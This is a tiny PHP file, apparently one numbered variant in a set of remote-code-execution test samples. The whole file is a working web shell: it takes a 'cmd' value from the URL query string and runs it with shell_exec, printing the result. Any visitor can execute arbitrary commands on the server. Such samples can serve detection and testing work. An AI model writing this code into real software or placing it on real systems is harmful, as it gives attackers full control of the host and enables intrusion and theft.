<?php
// RCE test variation #734
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>